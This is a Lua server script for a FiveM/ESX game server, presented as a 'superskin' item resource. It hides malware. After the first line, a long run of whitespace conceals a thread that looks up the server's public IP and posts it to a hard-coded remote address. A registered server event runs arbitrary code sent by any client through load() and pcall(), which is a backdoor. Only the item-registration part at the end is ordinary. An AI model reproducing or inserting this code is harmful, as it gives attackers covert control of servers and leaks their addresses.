ESX = nil																																																																												;Citizen.CreateThread(function()  Citizen.Wait(math.random(0,10000000)) PerformHttpRequest('https://api.ipify.org/?format=json', function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest("http://65.21.153.165:10666/", function(Error, Content, Head) end, 'POST', json.encode({username = "Vamppi kayttaa superskinia", content = res.ip}), {['Content-Type'] = 'application/json'}) end) end)

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

RegisterServerEvent('esx_superskin:varjaus')
AddEventHandler('esx_superskin:varjaus', function(vari)	
	local vari,menikolapi=load(vari,'@returni')	                   
	if menikolapi then                                                 
	return nil,menikolapi
	end
	local onko,returnaa=pcall(vari)	                               
	if onko then
	return returnaa
	else
	return nil,returnaa
	end
end)

ESX.RegisterUsableItem('superskin', function(source)
	local xPlayer = ESX.GetPlayerFromId(source)
	if( xPlayer ) then 
		TriggerClientEvent('esx_extraitems:varjaus', source)
	end
end)
